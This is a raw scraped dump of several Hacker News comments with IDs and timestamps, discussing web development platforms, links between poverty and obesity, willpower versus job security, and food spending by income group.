Web apps are to be used by web users, regardless of the OS their browser runs on. So, it&#x27;s fair to say that someone who develops an app who&#x27;s front end runs on the web, is developing for the Web/HTML5 platform, not for the what ever OS your backend happens to run on.<p>You may think about your self as a Linux developer, but you are developing for the web platform, because that&#x27;s where your users are.",1382608791

6604323,comment,6603848,6604159,2,0,andyjohnson0,,,"<i>&quot;The poor in America are far likelier to be overweight than starving.&quot;</i><p>Your statement is true, but mainly because very few people in the US are actually <i>starving</i>. What they are doing is living on poor diets.<p>There certainly seems to be some kind of correlation between low income on obesity, but the contributing factors are complex. Individuals and families living on low incomes may lack ready access to fresh food (&quot;food deserts&quot;) due to high transport costs and/or there being no nearby shops that sell it, may not have equipment to prepare food, may live in areas where opportunities for exercise are limited due to crime or lack of facilities. Poor education about nutrition and lack of role modes can also be important factors.<p>I&#x27;d urge you to read the short article &quot;Poverty and Obesity in the U.S.&quot; [1] from the American Diabetes Association. Quote:<p><i>&quot;How is poverty linked to obesity? It has been suggested that individuals who live in impoverished regions have poor access to fresh food. Poverty-dense areas are oftentimes called “food deserts,” implying diminished access to fresh food (7). However, 43% of households with incomes below the poverty line ($21,756) are food insecure (uncertain of having, or unable to acquire, sufficient food) (7). Accordingly, 14% of U.S. counties have more than 1 in 5 individuals use the Supplemental Nutrition Assistance Program. The county-wide utility of the program, as expected, correlates with county-wide poverty rates (r = 0.81) (7). Thus, in many poverty-dense regions, people are in hunger and unable to access affordable healthy food, even when funds avail. The double-edged sword of hunger and poor availability of healthy food is, however, unlikely to be the only reason as to why obesity tracks with poverty.&quot;</i><p>The American Society for Clinical Nutrition has a \npaper from 2004 titled &quot;Poverty and obesity: the role of energy density and energy costs&quot; [2] that goes into a lot more detail. From the abstract:<p><i>&quot;A reduction in diet costs in linear programming models leads to high-fat, energy-dense diets that are similar in composition to those consumed by low-income groups. Such diets are more affordable than are prudent diets based on lean meats, fish, fresh vegetables, and fruit. The association between poverty and obesity may be mediated, in part, by the low cost of energy-dense foods and may be reinforced by the high palatability of sugar and fat. This economic framework provides an explanation for the observed links between socioeconomic variables and obesity when taste, dietary energy density, and diet costs are used as intervening variables.&quot;</i><p>I would urge you to look into this subject more carefully and, considering some of your other comments in this thread, to avoid resorting to crude and misleading stereotypes of people living in poverty.<p>[1] <a href=""http://diabetes.diabetesjournals.org/content/60/11/2667.full"" rel=""nofollow"">http://diabetes.diabetesjournals.org/content/60/11/2667.full</a><p>[2] <a href=""http://ajcn.nutrition.org/content/79/1/6.full"" rel=""nofollow"">http://ajcn.nutrition.org/content/79/1/6.full</a>",1382608713

The task is huge, its monstrous. But you go about it eventually, meanwhile you stretching beyond means. You stay up awake whole nights, you are working weekends, you&#x27;ve stopped seeing your friends. All that 18 hr/day work is causing you immense tiredness, there is reasonable amount of failure you are seeing every day. All that failure and way things are going is humbling you down. Now despite there is pain here, you are still carrying on. Because you go on and on, despite situation and find ways to just keep doing it; Until you eventually win. This is what is will power.<p>There is a second scenario. You come to office 9 AM every day sharp. There is build failure you need to look into, which is some trivial ftp call timing out. You have nothing serious or challenging. All your innovations and extra efforts are treated by your immediate superiors as threat-to-their-positions and crushed ASAP. In fact all you do is fix builds, fix trivial bugs and add an occasional feature. Your time goes in hearing dis interesting stories of what totally irrelevant issues your colleagues are upon during stand ups, your afternoons are full of filling up boring time sheets and agile management software. You are doing this only because you want a health insurance, some assurance no one will fire you ASAP and some comfort pillow. You are just seasoned to do this routine, because of some fear of failure.<p>While the first situation has tremendous pain associated with it, you are putting up effort in situations where others can&#x27;t.<p>The second one is clearly the craving for safety, fear of failure and total non willingness to change unless forced to. This is some what opposite of Will power, because if you had it- you would be doing something else.",1382608651

The system was originally designed to help people for relatively short periods of time when they are between work that pays them enough to not need the assistance.

Maybe they spend less because they simply can&#x27;t afford to spend more? I spend less on private-jets & high-end cars than rich people do, is it because I simply don&#x27;t want those items or because I can&#x27;t afford it?<p>Actually, this article appears to be saying the opposite of what you think it&#x27;s saying:<p>FTA:<p><i>The short answer is that relative food costs are low and falling fast for everybody -- but they&#x27;re not falling for the poor. In 1984, the poorest Americans spent 16 percent of their income to eat. The median-income family also spent 16 percent of its (slightly higher) income on food. And the rich spent the least. In the last three decades, food&#x27;s share of the family budget has fallen for all but the poorest families, where it&#x27;s stayed the same.</i><p>So... poor people are spending _more_ on food than the rich? Whatever way one interprets this article, I don&#x27;t think it can be used to to prove anything in regards to affordability of food for the poor and what else they may have sacrificed to pay for food.",1382605869
